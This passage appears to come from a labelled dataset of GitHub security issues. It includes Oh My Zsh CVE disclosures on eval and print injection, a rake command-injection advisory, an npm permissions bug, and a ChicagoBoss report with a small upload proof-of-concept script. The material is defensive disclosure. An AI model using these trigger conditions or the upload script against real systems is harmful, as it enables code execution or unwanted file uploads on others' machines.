Currently, all events are specified as having the same format. I don't think the spec allows additional frames. So it is still incompatible if only done for new/draft events.I know, I just think it gets confusing having options to change behaviour of an API - but it's fine if there's no other wayThis issue has been automatically marked as stale because it has not had activity for 365 days. It will be closed if no further activity occurs within 56 days. Thank you for your contributions.
Did we do this as part of the event v2 API?No, not yet, but the event v2 API enables implementing thisGreat, reopening then",no,"Feature Request,Area (API change),Security,"
nette/nette,27636786,"Alternative login mechanism","There is a note in David's [TODO list](http://forum.nette.org/en/1369-ideas-for-further-development-of-nette) about alternative way to user authentication and one part of it will by quite handy to me - login from database.

I use nice ORM but entities cannot be serialized (what a surprise) so I have to have one more unwanted property `profile` which is set in a secured BasePresenter manualy. It contains all data I need, but there is still `$presenter::$user` which becames confusing now because it no longer holds all proper data.

This situation was quite schizophrenic to me so I decided to modify Identity and UserStorage. There is no problem to rewrite Identity, but when I tried to modify (inheritted) UserStorage, I have realized that there is only few lines to rewrite but due to private fields I had to copy almost whole implementation. 

So, is it possible to change [these 3 fileds](https://github.com/nette/nette/blob/master/Nette/Http/UserStorage.php#L22-L29) to protected or at least could you answer me, why there is such a [condition](https://github.com/nette/nette/blob/master/Nette/Http/UserStorage.php#L175)? I would like to store only id, but to modify this condition, I have to rewrite so much... for what reason?
","Related: http://forum.nette.org/cs/9574-jak-rozsirit-userstorage

Also have a look at https://github.com/Majkl578/nette-identity-doctrine
thx.

It's quite dirty workaround to me, but it's working =)
Yeah. I know it's dirty. Better than nothing though. ;-)
I disagree, [Majkl578/nette-identity-doctrine](https://github.com/Majkl578/nette-identity-doctrine) is awesome :)
",no,"1-feature,2-security,"
BitLucid/ninjawars,508354,"Hack Prevention: As a sysadmin, I want brute-force hacking of logins to be protected against.","We need to design and implement a way of preventing this. I'm thinking that failure should increment a counter, failing X times triggers a lock and an email, and that lock is stored as a date, and unless the lock is cleared via the email, logins will fail until X hours after lock was initially created.

Needs to be discussed.
","Mmm, denial of service is a problem with locks, although the email issue would protect against that somewhat.

In general, if we're going to go all the way, we might as well go all the way and protect against 5000 checks for different usernames with the same or similar simple passwords.

There's an interesting post on the topic here:
http://stackoverflow.com/questions/479233/what-is-the-best-distributed-brute-force-countermeasure
Which goes beyond protecting individuals into site-wide countermeasures.

And there's this interpretation: 
http://stackoverflow.com/questions/2090910/how-can-i-throttle-user-login-attempts-in-php/2093333#2093333
Which has a table suggestion for creating site-wide limitations, i.e.
CREATE TABLE failed_logins(
    id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(16) NOT NULL,
    ip_address INT(11) UNSIGNED NOT NULL,
    attempted DATETIME NOT NULL
);
or, better:
CREATE TABLE failed_logins(
    id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    login TEXT NOT NULL,
    ip_address INT(11) UNSIGNED NOT NULL,
    user_agent TEXT,
    attempted DATETIME NOT NULL,
    unlocked boolean default false
);
And then select against multiple criteria to determine delay and to determine locking mechanism.
I'm also looking to revise the login system in the near future to finally allow persistent login, so it might be a good time at that point for a complete overhaul of all the login stuff.
Created a login_attempts table.
@beagle Would you be willing to take point on this security issue?  No timeline, but it's either you or me so that this doesn't get lost in the bushes.
",no,"Important,Security,"
Arachnid/netboot.me,51132,"Sign & verify responses from netboot.me for security","gPXE should be enhanced with the ability to verify hashes and RSA signatures; netboot.me should return them, so that users can be assured there are no men-in-the-middle.
",,no,"feature request,bootloader,security,"
YaleSTC/shifts,40713856,"Upgrade to Rails 4","[Rails 3.2 is no longer supported for bug fixes, or anything less than a severe security issue.](http://guides.rubyonrails.org/maintenance_policy.html) We really can't afford to run any of our apps on Rails 3.2 anymore. We should upgrade ASAP after we finish getting Shifts 3 on Rails 3 as stable as possible.
","@njlxyaoxinwei This is now more critical because there are at least ]2 open security alerts for Rails 3.](https://gemnasium.com/YaleSTC/shifts/alerts)
Let me first get Shifts3 onto rails 3.2.21 then
",no,"diff: advanced,enhancement,security,"
ohmyzsh/ohmyzsh,1051887456,"Report for vulnerabilities in Oh My Zsh (2021-11-12)","[6 days ago](https://github.com/ohmyzsh/ohmyzsh/issues/10380) we were informed of a vulnerability in Oh My Zsh that could allow a malicious party to execute commands in a target's machine, **only if multiple conditions were met**.

The vulnerability (CVE-2021-3934) was reported via [huntr.dev](https://huntr.dev/bounties/ad2b5c3f-a3ce-4407-94dc-354c723310ce), and was found by @ry0tak ([Twitter](https://twitter.com/Ryotkak), [Blog](https://blog.ryotak.me/)).

I validated that the vulnerability was present in the latest release of Oh My Zsh, and that it could be exploited by a malicious party in a target's machine, in this case **with user intervention** and **only if the user had enabled a particular plugin and theme using it**. More information about this particular vulnerability will be provided below.

After reproducing that bug and finding a fix, I went looking for similar vulnerabilities in the Oh My Zsh project, and found 4 others that were similar, some easier to exploit than the first one reported.

Commits 6cb41b70, 06fc5fb1, a263cdac, 72928432 and b3ba9978 fix all of these vulnerabilities.

## TL;DR How do I apply the security patches?

The fix to all of these vulnerabilities is to just **update Oh My Zsh to the latest version**.

Run the following command:

```zsh
omz update
```

You might see something like this in the changelog:

![changelog screenshot](https://user-images.githubusercontent.com/1441704/141373919-e17da21e-f8fe-44b1-9c4a-3d7778058ab8.png)

b3ba9978 is the last in the series of fixes, which were **released in November 11 22:13 UTC**. If you updated after that you're already patched. **Please open an issue if you have trouble updating**.

## Vulnerabilities

### 1. Vulnerability in `omz_urldecode` function (CVE-2021-3934)

**You might be affected if**:

- You're using the `svn` plugin and themes using `svn_prompt_info`: `adben`, `awesomepanda`, `kiwi`, `minimal`.

- You're using the `omz_urldecode` function in custom user code.

**How it could be exploited**: checkout and cd into malicious svn repository.

### 2. Vulnerability in `dirhistory` plugin (CVE-2021-3725)

**You might be affected if**:

- You're using the `dirhistory` plugin.

**How it could be exploited**: cd in and out of a malicious directory.

### 3. Vulnerability in `title` function (CVE-2021-3726)

**You might be affected if**:

- You're using the `title` function **in custom user code**.

**How it could be exploited**: depends on the way you're using the `title` function. **With the default Oh My Zsh settings this is not vulnerable**.

### 4. Vulnerability in `rand-quote` and `hitokoto` plugins (CVE-2021-3727)

**You might be affected if**:

- You're using the `rand-quote` plugin.
- You're using the `quote` plugin.

**How it could be exploited**: a malicious quote has been shown (there is no real evidence of this).

### 5. Vulnerability in `pygmalion`, `pygmalion-virtualenv` and `refined` themes (CVE-2021-3769)

**You might be affected if**:

- You're using one of these themes.
- You use git repositories.

**How it could be exploited**: clone and cd into malicious git repository.

----

We will update the issue with details about how you could how this vulnerabilities would be used, which is more difficult than what you might think at first. Please **subscribe to this issue to get notified** when new information comes out. 

If you have any issues updating, please open a new support issue and we'll do our best to help.

If you need a place to discuss these vulnerabilities, or ask questions about them in general, use #10437.","UPDATE: the [huntr.dev](https://huntr.dev) report by @Ry0tak for the first vulnerability (CVE-2021-3934) is now public. [You can find it here](https://huntr.dev/bounties/ad2b5c3f-a3ce-4407-94dc-354c723310ce).
# Vulnerability details

Almost 3 weeks have passed since the initial fixes were pushed and the report was first announced. It's time now to give more details about these vulnerabilities:

- A longer description about the vulnerability
- Affected areas of the codebase
- What conditions need to happen to be vulnerable

CVEs have now been assigned to all vulnerabilities and the original post has been updated.

---

These vulnerabilities are different from each other due to how they can be exploited, but they essentially fall into these two types:

- Unsafe use of `eval`.
- Unsafe use of `print`.

# Unsafe use of `eval`

These 2 vulnerabilites have one thing in common: they use `eval` on a user-supplied string, which could be used by an attacker to execute arbitrary code. As I'll explain below, were this to be exploited it would be very obvious to you, but under the right conditions it could be done automatically without your knowledge.

## 1. Vulnerability in `omz_urldecode` function and `svn` plugin (CVE-2021-3934)

*This is the vulnerability that @Ry0taK found.*

**Description**: `omz_urldecode` (in `lib/functions.zsh`) uses `eval` to decode a URL-encoded string. The `svn` plugin uses that function to decode the URL of an svn repository, when running the `svn_prompt_info` function. This means that, if using a theme that uses this function, a malicious svn repository could trigger the bug in the `omz_urldecode` function and execute arbitrary code.

**Fixed in**: [6cb41b70](https://github.com/ohmyzsh/ohmyzsh/commit/6cb41b70).

**Impacted areas**:

- `omz_urldecode` in `lib/functions.zsh` and code that uses it (custom user code that uses it can be impacted as well).
- `svn_prompt_info` in `plugins/svn/svn.plugin.zsh` (if you're using the `svn-fast-info` plugin this doesn't affect you).
- Themes that use the `svn_prompt_info` function: `adben`, `awesomepanda`, `kiwi`, `minimal`.

**Conditions to exploit**:

These are the pre-conditions for vulnerability. Either:

- You use the `omz_urldecode` function in custom code. If that's the case, the conditions to exploit will depend on
  how you use the `omz_urldecode` function.

or

- You use the `svn` plugin **and** you use the `svn_prompt_info` function (the themes specified above do that by default).
  In this specific case, here's how this could be exploited:

   1. You check out a malicious svn repository.
   2. You cd into that repository in a directory with a specially-crafted name.
   3. You trigger the `svn_prompt_info` function inside that directory or its children (this happens automatically
      when using one of the mentioned themes).

## 2. Vulnerability in `dirhistory` plugin (CVE-2021-3725)

**Description**: the widgets that go back and forward in the directory history, triggered by pressing Alt-Left and Alt-Right, use functions that unsafely execute `eval` on directory names. If you happen to cd into one of these weirdly-named directories\* and press Alt-Left or Alt-Right, you could trigger the vulnerability.

\* When I say weirdly-named, this means that certain symbols need to appear, so you would definitely notice.

**Fixed in**: [06fc5fb](https://github.com/ohmyzsh/ohmyzsh/commit/06fc5fb).

**Impacted areas**:

As I said before, this vulnerability only affects the `dirhistory` plugin. Particularly, functions `pop_past` and
`pop_future`, which unsafely use `eval` on directory names.

**Conditions to exploit**:

1. You use the `dirhistory` plugin.
2. You cd into a directory with a specially-crafted name, or one of it's children.
3. You press Alt-Left or Alt-Right (this would happen instantly only by pressing Alt-Left).
   NOTE: in macOS, the plugin uses Option instead of Alt.

# Unsafe use of `print`

Zsh's `print` builtin is generally safe, but if used with `print -P` it could be unsafe if the `prompt_subst` option is enabled and the input is user-supplied.

## 3. Vulnerability in `title` function (CVE-2021-3726)

**Description**: the `title` function defined in `lib/termsupport.zsh` uses `print` to set the terminal title to a user-supplied string. In Oh My Zsh, this function is always used securely, but custom user code could use the `title` function in a way that is unsafe.

**Fixed in**: [a263cdac](https://github.com/ohmyzsh/ohmyzsh/commit/a263cdac).

**Impacted areas**:

- `title` function in `lib/termsupport.zsh`.
- Custom user code using the `title` function.

**Conditions to exploit**:

1. You have custom user code that uses the `title` function.

2. The `title` function receives inputs that isn't sanitized or can be supplied by an attacker.
   Similarly to the dirhistory plugin, this could be if you use the `title` function to set the
   terminal title to the name of a directory you cd into, and this directory has a weird name,
   in a similar but not equal way to the dirhistory plugin.

**In Oh My Zsh this doesn't happen**, so again I'd like to emphasize that **custom user code needs
to be used for this vulnerability to exist**.

### 4. Vulnerability in `rand-quote` and `hitokoto` plugins (CVE-2021-3727)

The `rand-quote` and `hitokoto` plugins define functions that fetch quotes from quotationspage.com and hitokoto.cn respectively. I have found no evidence that these sites contain malicious quotes, but I can't be sure that they don't.

I debated whether to consider this a vulnerability, given that the ""attacker"" would need to compromise these 2 websites. Nevertheless, you can never be too safe. But please read this with skepticism.

**Description**: the `rand-quote` and `hitokoto` fetch quotes from quotationspage.com and hitokoto.cn respectively, do some process on them and then uses `print` to print them. If these quotes contained the proper symbols, they could trigger command injection.

**Fixed in**: [72928432](https://github.com/ohmyzsh/ohmyzsh/commit/72928432).

**Impacted areas**:

- `rand-quote` plugin (`quote` function).
- `hitokoto` plugin (`hitokoto` function).

**Conditions to exploit**:

1. The user has either of these plugins enabled, and uses the `quote` or `hitokoto` function to
   fetch quotes (this is normally used as a Message Of The Day, to display a quote on login).

2. The website offers a quote that contains malicious input. This malicious input needs to contain
   the proper symbols for Zsh to interpret it as a command.

3. In the case of the `rand-quote` plugin, this quote would need to be the first one in the
   returned list of quotes, due to the nature of how the plugin works.

4. The quote with malicious input is printed to the terminal and the commands in the quote executed.

## 5. Vulnerability in `pygmalion`, `pygmalion-virtualenv` and `refined` themes (CVE-2021-3769)

**Description**: these themes use `print` on user-supplied strings to print them to the terminal.
All of them do that on git information, particularly the branch name, so if the branch is specially-named
the vulnerability could be triggered.

**Fixed in**: [b3ba9978](https://github.com/ohmyzsh/ohmyzsh/commit/b3ba9978).

**Impacted areas**:

- `pygmalion` theme.
- `pygmalion-virtualenv` theme.
- `refined` theme.

**Conditions to exploit**:

1. You have enabled one of the themes mentioned above.
2. You clone a git repository that has a specially-named branch.
3. You cd into the repository or one of its child directories.
4. The theme runs the code that prints the branch name, triggering the vulnerability.

----

As always, you can discuss these vulnerabilities in https://github.com/ohmyzsh/ohmyzsh/discussions/10437 or on our [Discord server](https://discord.gg/ohmyzsh).",no,"Security,Area: meta,"
bossmc/joker,940426394,"[Security] Update rake requirement from ~> 10 to >= 10, < 14","Updates the requirements on [rake](https://github.com/ruby/rake) to permit the latest version.
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rake/CVE-2020-8130.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>OS Command Injection in Rake</strong>
There is an OS command injection vulnerability in Ruby Rake &lt; 12.3.3 in
Rake::FileList when supplying a filename that begins with the pipe character
<code>|</code>.</p>
<p>Patched versions: &gt;= 12.3.3
Unaffected versions: none</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jppv-gw3r-w3q8"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects rake</strong>
There is an OS command injection vulnerability in Ruby Rake before 12.3.3 in Rake::FileList when supplying a filename that begins with the pipe character <code>|</code>.</p>
<p>Affected versions: &lt;= 12.3.2</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/ruby/rake/blob/master/History.rdoc"">rake's changelog</a>.</em></p>
<blockquote>
<p>=== 13.0.6</p>
<ul>
<li>Additional fix for <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/389"">#389</a>
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/390"">#390</a> by hsbt</li>
</ul>
<p>=== 13.0.5</p>
<ul>
<li>Fixed the regression of <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/388"">#388</a>
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/389"">#389</a> by hsbt</li>
</ul>
<p>=== 13.0.4</p>
<ul>
<li>Fix rake test loader swallowing useful error information.
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/367"">#367</a> by deivid-rodriguez</li>
<li>Add -C/--directory option the same as GNU make.
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/376"">#376</a> by nobu</li>
</ul>
<p>=== 13.0.3</p>
<ul>
<li>Fix breaking change of execution order on TestTask.
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/368"">#368</a> by ysakasin</li>
</ul>
<p>=== 13.0.2</p>
<p>==== Enhancements</p>
<ul>
<li>Fix tests to work with current FileUtils
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/358"">#358</a> by jeremyevans</li>
<li>Simplify default rake test loader
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/357"">#357</a> by deivid-rodriguez</li>
<li>Update rdoc
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/366"">#366</a> by bahasalien</li>
<li>Update broken links to rake articles from Avdi in README
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/360"">#360</a> by svl7</li>
</ul>
<p>=== 13.0.1</p>
<p>==== Bug fixes</p>
<ul>
<li>Fixed bug: Reenabled task raises previous exception on second invokation
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/271"">#271</a> by thorsteneckel</li>
<li>Fix an incorrectly resolved arg pattern
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/327"">#327</a> by mjbellantoni</li>
</ul>
<p>=== 13.0.0</p>
<p>==== Enhancements</p>
<ul>
<li>Follows recent changes on keyword arguments in ruby 2.7.
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/326"">#326</a> by nobu</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/ruby/rake/commit/5c60da8644a9e4f655e819252e3b6ca77f42b7af""><code>5c60da8</code></a> Bump up Rake-13.0.6</li>
<li><a href=""https://github.com/ruby/rake/commit/73d4099cc9f5f49d0dd5859850cc0582596ca4a2""><code>73d4099</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/390"">#390</a> from ruby/fix-388-again</li>
<li><a href=""https://github.com/ruby/rake/commit/63aacb6c87c9e423102ddd7f7a09292000f911a7""><code>63aacb6</code></a> Added Rake namespace explicitly</li>
<li><a href=""https://github.com/ruby/rake/commit/29a3949faca43b8f6b94967160bf1ec429b1113b""><code>29a3949</code></a> Bump version to v13.0.5</li>
<li><a href=""https://github.com/ruby/rake/commit/3a95f4cc4259e04d61af90f61ce0aa36ab94a236""><code>3a95f4c</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/389"">#389</a> from ruby/fix-388</li>
<li><a href=""https://github.com/ruby/rake/commit/85c55b49a1ea85840e6f3eb19cc52bf8bd3af62b""><code>85c55b4</code></a> Fixed the regression of <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/388"">#388</a></li>
<li><a href=""https://github.com/ruby/rake/commit/72ac79629ac1de851f7ee27fbec0a16eddef937d""><code>72ac796</code></a> History for rake-13.0.4</li>
<li><a href=""https://github.com/ruby/rake/commit/b20de7859dc94684ba30006bb5b0008af429fb5f""><code>b20de78</code></a> Bump version to 13.0.4</li>
<li><a href=""https://github.com/ruby/rake/commit/a07e637c080d8674cd2e1da26c51aaacb67b2d80""><code>a07e637</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/386"">#386</a> from ruby/cleanup</li>
<li><a href=""https://github.com/ruby/rake/commit/0acc575ef1c737e442aadc6d1ea2e3d7051e982a""><code>0acc575</code></a> Use require_relative to specify release version</li>
<li>Additional commits viewable in <a href=""https://github.com/ruby/rake/compare/v10.4.2...v13.0.6"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=rake&package-manager=bundler&previous-version=10.4.2&new-version=13.0.6)](https://dependabot.com/compatibility-score/?dependency-name=rake&package-manager=bundler&previous-version=10.4.2&new-version=13.0.6)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
npm/npm,102234932,"umask setting is ignored for some directories","### Expected Behavior

All directories created by `npm install` should have the npm config setting `umask` applied to their file mode/permissions. The `umask` setting is [clearly described as](https://docs.npmjs.com/misc/config#umask) the ""value to use when setting the file creation mode on files and folders.""
### Observed Behavior

During `npm install`, if directories are created by the `tar` module as a side-effect of extracting a file, the umask setting is ignored. For example, when tar extracts `foo/bar/baz.js`, it creates the `foo` and `foo/bar` directories (if they don't exist) before writing `baz.js`. These directories do not respect the umask setting.

Instead, npm's umask setting is ignored and [`process.umask()` is used](https://github.com/npm/fstream/blob/master/lib/writer.js#L15). However, there is a further bug/unexpected behavior where the `tar` module will actually [do the equivalent of `chmod a+x`](https://github.com/npm/fstream/blob/master/lib/writer.js#L352) on directories created as a side-effects of file extraction, meaning the even `process.umask()` isn't strictly observed.
### Details
- OS: Mac OS X 10.9.5
- `npm --version`: `2.13.5`
- `node --version`: `v0.10.40`
- `npm config get umask`: `0077`
- `umask`: `0077`

An example is seen if you install `grunt-lib-phantomjs`. The directory `node_modules/phantomjs/lib` (as an example) should have a mode of `0700`; instead, it has a mode of `0711`.
","Since I see this has been tagged as a feature request and support request, I want to be clear that this is definitely a bug in npm.

The umask setting in npm is being completely ignored for a seemingly arbitrary subset of operations during `npm install`. This is almost certainly not the intended behavior. It also explicitly disagrees with the behavior described in the documentation, and is inconsistent even within the observed behavior of npm (sometimes it respects umask, other times it doesn't, for no good reason).

The underlying cause (cited in the issue) is that the tar module isn't aware of npm's `umask` setting, and just does its own thing (using the `process.umask()` value, then overriding the execute bit on it.)

But in summary, this is 99.9% likely to be a real bug, not a new feature or user usage problem. 
This issue still exists in npm version 3.4.0 and is most certainly a bug and not a new feature or user usage problem.

Please see https://github.com/npm/npm/issues/4197 which is correctly tagged as a bug.

#### Details
- OS: Debian GNU/Linux 7.8 (wheezy)
- `npm --version`: `3.4.0`
- `node --version`: `v4.2.2`
- `npm config get umask`: `0022`
- `umask`: `0077`
This is marked as a feature request in part because the current behavior that npm has is underspecified. The first step to making npm's behavior here clearer is to nail down what the current behavior is, and why. Tagging this with `footgun` gets it onto npm's road map, and the next step for the CLI team is to unearth and document the historical reasoning for how the various pieces of npm (including `node-tar`) handle permissions.
After discussing this as a team, we think the right thing for npm to do is to ignore whatever permissions or UIDs are set in the package tarball, and explicitly squash everything to be written with the current user's user ID and umask in all cases _except_ when npm is being run as root without `--unsafe-perm` being overwritten (you should never have files owned by nobody on your filesystem).

This is a mildly tricky bit of work because it requires good tests, and also because we need to make sure whatever API calls the CLI uses don't cause problems on Windows, but this is something we plan to address within the medium-term. If somebody else wants to treat the first paragraph as a rough spec and start working on a patch, that would be very welcome!
Did this issue get lost (honest question, no sarcasm)?
In my opinion it needs lot more love as the possible security implications could be quite catastrophic on a multi-user system and this issue is reported for over a year now.
The worst case scenario is that such directory results in the possibility to replace its content by a non-root user with evil code that may me executed by another user (including possibly root).

What I observed (even with newest npm 3.10.9) that it **sometimes** creates node_modules directories with permission 777. when doing the `npm install` multiple times the results vary, most of the time it results in 755 but sometimes in 777). This seems to have nothing to do with the source tarballs content (retrieved from registry.npmjs.org) but a more general issue. As mentioned, its not deterministic and the tarballs definitively don't contain any files/directories with such permissions.

This problem was observed while creating packages for a Linux distribution and boiled down to finding this ticket.
We're closing this issue as it has gone thirty days without activity.  In our experience if an issue has gone thirty days without any activity then it's unlikely to be addressed.  In the case of bug reports, often the underlying issue will be addressed but finding related issues is quite difficult and often incomplete.

If this was a bug report and it is still relevant then we encourage you to open it again as a new issue.  If this was a feature request then you should feel free to open it again, or even better open a PR.

For more information about our new issue aging policies and why we've instituted them please see our [blog post](http://blog.npmjs.org/post/161832149430/npm-the-npm-github-issue-tracker-and-you).
@othiym23 @isaacs @iarna
can you please reopen and revisit this issue, npm 5.6.0 still randomly ends up creating node_modules directories with 777 that contain code.
PS: This npm-robot that auto-closes a security issue because nobody replied is quite damaging
  Aug 20, 2015

O I am laffin.Issue not fixed in 30 days?
Must be gone!Not treating security seriously, are we?Yeah, this seems to have gotten swept up -- the bot shouldn't have just closed the issue like that.

There was a step forward and a step back on this over the past year, and we haven't touched the issue since. The `patch-welcome` tag continues to apply, so if you think writing code is a more worthwhile endeavor than snarking on foss issue trackers, we super welcome your contributions!",no,"bug,patch-welcome,feature-request,footgun,security,already-looked-at,bot-closed,"
chusopr/casimir,485998287,"Hide git files","When the webroot is cloned from git, the default `.htaccess` file allows access to the `.git` and `.gitignore`.",,no,"Security,"
ChicagoBoss/ChicagoBoss,182091097,"Any controller will accept an uploaded file even if there's no POST method and put it in scratch/","I tried uploading a file to the default / handler in my application with the following script. (cat.jpg is just a file sitting in the same directory as this script)

```
# upload.py tests file open vulnerability in Erlang ""ChicagoBoss"" framework
# use ""poster"" package https://atlee.ca/software/poster/
# pip install poster

from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import urllib2

# Register the streaming http handlers with urllib2
register_openers()

# Start the multipart/form-data encoding of the file ""DSC0001.jpg""
# ""cat"" is the name of the parameter, which is normally set
# via the ""name"" parameter of the HTML <input> tag.

# headers contains the necessary Content-Type and Content-Length
# datagen is a generator object that yields the encoded parameters
datagen, headers = multipart_encode({""cat"": open(""cat.jpg"", ""rb"")})

# Create the Request object
request = urllib2.Request(""http://10.0.1.195/"", datagen, headers)
# Actually do the request, and get the response
print urllib2.urlopen(request).read()
```

There's no POST handler at route /

```
-module(beakconsole_main_controller, [Req]).
-compile(export_all).

before_(_) ->
    user_lib:require_login(Req).

index('GET', [], ChannelMaster) ->
    % return the name of this node (node) and a list of all connected nodes (nodes)
    { ok, [{channelmaster, ChannelMaster}, {node, node()}, {nodes, nodes()}] }.

error404('GET', []) ->
    { ok, []}.
```

A scratch directory is created:

```
[famserve@localhost beakconsole]$ ls -lat
total 280
drwxr-xr-x.  9 famserve famserve   4096 Oct 10 14:55 .
drwxr-xr-x.  2 web      web       4096 Oct 10 14:55 scratch
```

and the file is there:

```
[famserve@localhost beakconsole]$ ls -l scratch/
total 24
-rw-r--r--. 1 web web 22491 Oct 10 14:55 63-138-82-204-201-145-151-170-221-154-79-155-142-101-27-104
[famserve@localhost beakconsole]$ 
```

It would probably be a good idea to at least check to see if there's a Post Method before allowing this. 

Also, the user wasn't logged in, so the before_ method actually redirected to my login controller. And the file still made it up!

```
[swirsky@Thrills-iMac test (develop)]$ python upload.py 


<form method=""post"">
Name:<br />
<input name=""name"" /><br /><br />

Password:<br />
<input name=""password"" type=""password"" /><br /><br />

<input type=""submit"" value=""Log in"" />
<input type=""hidden"" name=""redirect"" value=""/main"" />
</form>
```

I think I can handle this in the before_, but I didn't expect this. I noticed it when some systems we have in production were collecting all sorts of ""malware"" in this scratch directory. (Fortunately, none of this PhP malware has any power in this directory and in the Erlang Universe.)
","I think this is mainly a SimpleBridge issue, but there may be away to control SimpleBridge so it doesn't do this.

The quickest workaround I found was to add a 'POST' handler that deletes the file.
Yeah this one also surprised me. The same behaviour does also apply to [simple_bridge_handler_sample.erl](https://github.com/nitrogen/simple_bridge/blob/master/src/simple_bridge_handler_sample.erl), which could be easily reproduced with the `simple_bridge` example server:

``` sh
> make run_inets
...
> curl -X GET http://127.0.0.1:8000/peer_ip -F 'file1=@<pathh_to_file>'
...
> ls -l scratch/
total 3520
-rw-r--r--  1 david  staff   1.7M Nov  5 15:44 78-200-77-73-91-82-21-199-130-108-240-188-19-104-115-117
```

 Not sure if it's some kind of default case misbehaviour or maybe even intentional. Maybe @choptastic could be so kind and give us some details on how it's intended?

@chatterbeak we came up with another workaround which seems IMHO to be a little bit more complete and prevents from forgetting some controller endpoints. We're using a `boss_filter` which looks similar to this one:

``` erl
-module(some_boss_filter).

-export([
    after_filter/3
]).

after_filter({StatusCode, Payload, Headers}, _FilterConfig, RequestContext) ->
    case lists:keyfind(request, 1, RequestContext) of
        {request, Request} ->
            handle_request_cleanup(Request);
        false ->
            lager:error(""Couldn't find request in context for final data cleanup"", [RequestContext])
    end,
    {StatusCode, Payload, Headers};
after_filter(Other, _FilterConfig, _RequestContext) ->
    %% Will match for 500er errors
    Other.

%%--------------------------------------------------------------------
%%% Internal functions
%%--------------------------------------------------------------------

handle_request_cleanup(Request) ->
    lists:foreach(fun(Attachment) ->
        {LogLevel, DeleteResult} =
        case file:delete(sb_uploaded_file:temp_file(Attachment)) of
            {error, enoent} ->
                %% The file was already deleted from business logic so only a debug log is needed
                {debug, file_already_deleted};
            OtherReturn ->
                {notice, OtherReturn}
        end,
        lager:log(LogLevel, self(), ""Deleting remaining temporary file ~p with name ~p, size ~p byte and ""
                                    ""field_name ~p from scratch folder; result: ~p"", [
            sb_uploaded_file:temp_file(Attachment),
            sb_uploaded_file:original_name(Attachment),
            sb_uploaded_file:size(Attachment),
            sb_uploaded_file:field_name(Attachment),
            DeleteResult
        ])
    end, Request:post_files()).
```

and in in the `boss.config`:

``` erl
[{boss, [
    ...
    {controller_filter_modules, [
         some_boss_filter
    ]},
    ...
]}]
```
Thanks for the ideas. 

I noticed this because various ""malicious"" php scripts were appearing in the scratch directory on some of my ChicagoBoss sites. Fortunately, the couldn't really do harm. But if you look at the constant barrage of PHP exploit attempts that any public website sees, it's common for these exploit suites to try uploading files to ""/"" and seeing if they can get them to run.
",no,"security,"
pierrel/SomethingToWear,78777,"Validation sometimes doesn't run","Happens very sporadically when trying to ""like"" an outfit.

This is from the couchdb log:
[debug] [<0.3078.0>] 'POST' /wear/ {1,1}
Headers: [{'Accept',""application/json, text/javascript, _/_""},
          {'Accept-Encoding',""gzip, deflate""},
          {'Accept-Language',""en-us""},
